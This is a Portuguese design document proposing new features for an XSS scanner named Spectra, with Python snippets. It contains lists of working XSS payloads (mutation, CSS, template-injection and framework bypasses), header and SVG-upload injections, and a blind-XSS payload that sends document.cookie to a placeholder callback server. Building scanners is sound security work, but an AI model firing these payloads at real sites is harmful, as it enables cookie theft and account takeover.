# Melhorias e Adições para o XSS Scanner - Spectra

## 📊 Análise Atual
O XSS Scanner atual já possui funcionalidades avançadas como:
- ✅ XSS Refletido, DOM XSS, XSS Armazenado
- ✅ Análise de contexto
- ✅ Detecção de WAF
- ✅ Variações de encoding
- ✅ Verificação com Selenium
- ✅ Parameter mining
- ✅ Análise básica de CSP

## 🚀 Novos Tipos de XSS para Implementar

### 1. **Mutation XSS (mXSS)**
```python
def _test_mutation_xss(self):
    """Testa vulnerabilidades de mutação HTML/DOM."""
    mutation_payloads = [
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<svg><foreignObject><iframe src=\"javascript:alert(1)\"></iframe></foreignObject></svg>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<table><tr><td><svg><foreignObject><p>x</p><iframe src=\"javascript:alert(1)\"></iframe></foreignObject></svg></td></tr></table>"
    ]
```

### 2. **CSS-based XSS**
```python
def _test_css_xss(self):
    """Testa XSS através de CSS injection."""
    css_payloads = [
        "body{background:url('javascript:alert(1)');}",
        "@import 'javascript:alert(1)';",
        "div{content:url('data:text/html,<script>alert(1)</script>');}",
        "*{xss:expression(alert(1));}"  # IE specific
    ]
```

### 3. **JSONP XSS**
```python
def _test_jsonp_xss(self):
    """Testa XSS via JSONP callbacks vulneráveis."""
    jsonp_payloads = [
        "alert(1)//",
        "alert(1);",
        "callback=alert(1)",
        "jsonp=<script>alert(1)</script>"
    ]
```

### 4. **PostMessage XSS**
```python
def _test_postmessage_xss(self):
    """Testa XSS via postMessage API."""
    # Implementar detecção de event listeners vulneráveis
    postmessage_payloads = [
        "<script>parent.postMessage('<img src=x onerror=alert(1)>','*')</script>",
        "data:text/html,<script>top.postMessage('alert(1)','*')</script>"
    ]
```

### 5. **WebSocket XSS**
```python
def _test_websocket_xss(self):
    """Testa XSS através de WebSockets."""
    # Detectar WebSocket endpoints e testar payloads
    pass
```

### 6. **Template Injection XSS**
```python
def _test_template_injection_xss(self):
    """Testa Template Injection que pode levar a XSS."""
    template_payloads = [
        "{{constructor.constructor('alert(1)')()}}",  # Angular
        "${alert(1)}",  # Template literals
        "#{alert(1)}",  # Ruby ERB
        "<%=alert(1)%>",  # JSP/ASP
        "{{alert(1)}}",  # Handlebars/Mustache
        "[[${alert(1)}]]"  # Thymeleaf
    ]
```

## 🔧 Funcionalidades Avançadas

### 1. **Blind XSS Detection**
```python
class BlindXSSDetector:
    def __init__(self, callback_server="https://your-callback-server.com"):
        self.callback_server = callback_server
        self.unique_id = str(uuid.uuid4())
    
    def generate_blind_payload(self):
        return f"""<script>
        fetch('{self.callback_server}/xss/{self.unique_id}?data='+btoa(document.domain+','+document.cookie));
        </script>"""
    
    def check_callbacks(self):
        # Verificar se houve callbacks no servidor
        pass
```

### 2. **HTTP Headers XSS**
```python
def _test_header_xss(self):
    """Testa XSS via HTTP headers."""
    headers_to_test = [
        'User-Agent', 'Referer', 'X-Forwarded-For',
        'X-Real-IP', 'X-Originating-IP', 'CF-Connecting-IP',
        'True-Client-IP', 'X-Cluster-Client-IP'
    ]
    
    for header in headers_to_test:
        malicious_headers = {header: "<script>alert('header-xss')</script>"}
        # Testar se o header é refletido na resposta
```

### 3. **File Upload XSS**
```python
def _test_file_upload_xss(self):
    """Testa XSS em uploads de arquivos."""
    svg_payload = '''<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
        <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        <script type="text/javascript">alert('XSS in SVG');</script>
    </svg>'''
    
    xml_payload = '''<?xml version="1.0"?>
    <!DOCTYPE html [<!ENTITY xxe SYSTEM "javascript:alert('XXE-XSS')">]>
    <html>&xxe;</html>'''
```

### 4. **Framework-Specific Bypasses**
```python
def _get_framework_bypasses(self, framework):
    """Retorna bypasses específicos para frameworks."""
    bypasses = {
        'react': [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "vbscript:alert(1)"  # IE
        ],
        'angular': [
            "{{constructor.constructor('alert(1)')()}}",
            "{{toString.constructor.prototype.toString.constructor.prototype.call.call({},toString.constructor.prototype.toString.constructor,(function(){alert(1)})())}}"
        ],
        'vue': [
            "{{this.constructor.constructor('alert(1)')()}}",
            "{{this.$el.ownerDocument.defaultView.alert(1)}}"
        ]
    }
    return bypasses.get(framework, [])
```

## 🛡️ Detecção e Análise Avançada

### 1. **Análise CSP Profunda**
```python
def _analyze_csp_advanced(self, response):
    """Análise avançada de CSP com detecção de bypasses específicos."""
    csp_analysis = self._analyze_csp(response)
    
    # Adicionar verificações para:
    # - Trusted Types
    # - require-trusted-types-for
    # - unsafe-hashes
    # - strict-dynamic
    # - nonce vulnerabilities
    # - hash collisions
    
    return csp_analysis
```

### 2. **Detecção de Trusted Types**
```python
def _check_trusted_types(self, response):
    """Verifica se Trusted Types está ativo."""
    js_check = '''
    return {
        trustedTypes: typeof window.trustedTypes !== 'undefined',
        isHTML: typeof window.trustedTypes?.createPolicy !== 'undefined',
        policies: window.trustedTypes?.getPolicyNames?.() || []
    };
    '''
```

### 3. **Feature Policy/Permissions Policy Analysis**
```python
def _analyze_feature_policy(self, response):
    """Analisa Feature Policy e Permissions Policy."""
    feature_policy = response.headers.get('Feature-Policy', '')
    permissions_policy = response.headers.get('Permissions-Policy', '')
    
    # Verificar políticas que podem afetar XSS
    return {
        'javascript': 'javascript' in feature_policy,
        'eval': 'unsafe-eval' in permissions_policy,
        'inline': 'unsafe-inline' in permissions_policy
    }
```

## ⚡ Otimizações de Performance

### 1. **Paralelização Inteligente**
```python
import asyncio
import aiohttp

async def _async_scan_reflected(self, tasks):
    """Scan assíncrono para melhor performance."""
    async with aiohttp.ClientSession() as session:
        semaphore = asyncio.Semaphore(10)  # Limite de conexões simultâneas
        
        async def test_payload(method, url, param, payload):
            async with semaphore:
                # Implementar teste assíncrono
                pass
```

### 2. **Cache Inteligente**
```python
class ResponseCache:
    def __init__(self, max_size=1000):
        self.cache = {}
        self.max_size = max_size
    
    def get_cache_key(self, url, params):
        return hashlib.md5(f"{url}:{sorted(params.items())}".encode()).hexdigest()
    
    def is_cached(self, cache_key):
        return cache_key in self.cache
```

### 3. **Rate Limiting Adaptativo**
```python
def _adaptive_rate_limit(self, waf_detected, error_rate):
    """Ajusta rate limiting baseado em detecção de WAF e taxa de erro."""
    if waf_detected:
        if error_rate > 0.5:
            return 2.0  # 2 segundos entre requests
        elif error_rate > 0.2:
            return 1.0  # 1 segundo
        else:
            return 0.5  # 0.5 segundos
    else:
        return 0.1  # Sem WAF, mais rápido
```

## 📊 Relatórios e Export

### 1. **Export SARIF**
```python
def export_sarif(self):
    """Exporta resultados no formato SARIF."""
    sarif_report = {
        "version": "2.1.0",
        "runs": [{
            "tool": {
                "driver": {
                    "name": "Spectra XSS Scanner",
                    "version": "1.0.0"
                }
            },
            "results": self._convert_to_sarif_results()
        }]
    }
    return json.dumps(sarif_report, indent=2)
```

### 2. **Screenshots Automáticos**
```python
def _capture_xss_screenshot(self, url, payload):
    """Captura screenshot de XSS confirmado."""
    if self.driver:
        try:
            self.driver.get(url)
            screenshot_path = f"xss_proof_{int(time.time())}.png"
            self.driver.save_screenshot(screenshot_path)
            return screenshot_path
        except Exception as e:
            self.logger.error(f"Erro ao capturar screenshot: {e}")
    return None
```

### 3. **Proof of Concept Automático**
```python
def generate_poc(self, vulnerability):
    """Gera Proof of Concept automático."""
    poc_template = """
    # XSS Proof of Concept
    
    **URL:** {url}
    **Parâmetro:** {parameter}
    **Payload:** {payload}
    **Tipo:** {xss_type}
    **Risco:** {risk}
    
    ## Como Reproduzir:
    1. Acesse: {url}
    2. Injete o payload: {payload}
    3. Observe a execução do JavaScript
    
    ## Curl Command:
    ```bash
    {curl_command}
    ```
    
    ## Screenshot:
    {screenshot_path}
    """
    
    return poc_template.format(**vulnerability)
```

## 🔬 Detecção de Tecnologias Avançada

### 1. **Fingerprinting de SPA Frameworks**
```python
def _detect_spa_framework(self, response):
    """Detecta frameworks SPA para otimizar payloads."""
    frameworks = {
        'react': ['react', '__REACT_DEVTOOLS_GLOBAL_HOOK__', 'ReactDOM'],
        'angular': ['ng-version', 'angular', 'ng-app'],
        'vue': ['__VUE__', 'vue', 'v-if'],
        'ember': ['ember', 'Ember'],
        'svelte': ['svelte', '__svelte']
    }
    
    detected = []
    content = response.text.lower()
    
    for framework, signatures in frameworks.items():
        if any(sig.lower() in content for sig in signatures):
            detected.append(framework)
    
    return detected
```

### 2. **Detecção de Content Management Systems**
```python
def _detect_cms(self, response):
    """Detecta CMS para payloads específicos."""
    cms_signatures = {
        'wordpress': ['wp-content', 'wp-includes', 'wp-admin'],
        'drupal': ['drupal', 'sites/default'],
        'joomla': ['joomla', 'administrator'],
        'magento': ['magento', 'skin/frontend'],
        'shopify': ['shopify', 'cdn.shopify']
    }
    # Implementar detecção
```

## 🎯 Prioridades de Implementação

### Fase 1 (Alta Prioridade)
1. ✅ **Blind XSS Detection** - Impacto muito alto
2. ✅ **HTTP Headers XSS** - Comum e importante
3. ✅ **Mutation XSS** - Técnica avançada atual
4. ✅ **Paralelização** - Melhoria significativa de performance

### Fase 2 (Média Prioridade)
1. ✅ **CSS-based XSS** - Menos comum mas importante
2. ✅ **Template Injection XSS** - Relevante para apps modernas
3. ✅ **Framework-specific bypasses** - Melhora eficácia
4. ✅ **Export SARIF** - Integração com ferramentas

### Fase 3 (Baixa Prioridade)
1. ✅ **WebSocket XSS** - Menos comum
2. ✅ **File Upload XSS** - Específico
3. ✅ **PostMessage XSS** - Técnica específica
4. ✅ **Screenshots automáticos** - Nice to have

## 📝 Conclusão

O XSS Scanner atual é robusto, mas essas melhorias o tornariam uma das ferramentas mais avançadas disponíveis, cobrindo técnicas modernas e otimizando performance para scans em larga escala.

**Estimativa de implementação:** 40-60 horas de desenvolvimento para implementar todas as funcionalidades da Fase 1 e 2.
